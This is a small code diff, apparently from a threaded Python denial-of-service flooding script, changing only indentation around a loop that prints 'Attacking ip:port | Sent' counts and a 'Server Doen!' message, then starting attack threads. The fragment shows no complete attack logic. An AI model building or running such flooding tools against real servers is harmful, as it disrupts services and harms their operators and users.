@@ -99,9 +99,9 @@ def start():
                 xx += random.randint(0, int(packs))
                 print("\033[96m[+\033[96m] \033[92mAttacking {0}:{1} | Sent: {2}\033[0m".format(str(ip), int(port), xx))
 
-       except:
+        except:
                s.close()
-            print("[+]Server Doen!.")
+               print("[+]Server Doen!.")
 for x in range(thread):
     thred = threading.Thread(target=start)
     thred.start()
